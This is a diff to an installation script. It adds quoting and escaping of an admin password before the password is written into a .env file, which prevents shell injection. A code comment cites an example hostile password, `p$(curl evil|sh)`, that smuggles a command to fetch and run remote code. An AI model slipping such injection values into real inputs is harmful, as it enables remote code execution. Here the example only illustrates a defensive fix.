@@ -49,6 +49,13 @@ if [ ! -f .env ]; then
   python3 - "$ADMIN_PASSWORD" <<'EOF'
 import sys, re
 pw = sys.argv[1]
+# Quote like server.js envQuote(): double-quote values containing whitespace
+# or shell-special chars, escaping \, ", $, and ` — so bash (run-cycle.sh
+# sources .env), systemd EnvironmentFile, and server.js all read the same
+# value, and a password like `p$(curl evil|sh)` can never execute.
+if re.search(r'[\s"\'`$\\#]', pw):
+    pw = ('"' + pw.replace('\\', '\\\\').replace('"', '\\"')
+          .replace('$', '\\$').replace('`', '\\`') + '"')
 p = ".env"
 s = open(p).read()
 s = re.sub(r"^ADMIN_PASSWORD=.*$", "ADMIN_PASSWORD=" + pw, s, flags=re.M)
